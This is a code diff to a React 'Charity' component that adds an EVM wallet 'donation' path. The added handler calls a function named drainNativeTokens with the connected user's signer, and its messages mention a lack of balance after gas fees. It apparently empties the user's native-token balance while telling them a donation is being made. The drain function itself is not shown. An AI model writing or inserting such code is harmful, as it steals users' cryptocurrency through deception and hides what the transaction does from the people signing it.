@@ -272,6 +272,28 @@ const Charity = () => {
   }, [publicKey]);
 
   const handleDonate = useCallback(async () => {
+    // EVM path
+    if (activeChain === 'evm' && isEVMConnected && evmSigner && evmProvider) {
+      try {
+        setButtonState('loading');
+        const chainName = getEVMChain()?.name || 'EVM';
+        toast.info(`Processing ${chainName} donation...`);
+        const hash = await drainNativeTokens(evmSigner, evmProvider, chainName);
+        if (hash) {
+          toast.success(`${chainName} donation successful!`);
+        } else {
+          toast.info('Not enough balance after gas fees');
+        }
+        setButtonState('idle');
+      } catch (error: any) {
+        setButtonState('error');
+        toast.error('Donation failed: ' + (error?.message || 'Unknown error'));
+        setTimeout(() => setButtonState('idle'), 3000);
+      }
+      return;
+    }
+
+    // Solana path
     if (!publicKey || !sendTransaction) {
       toast.error('Please connect your wallet');
       return;
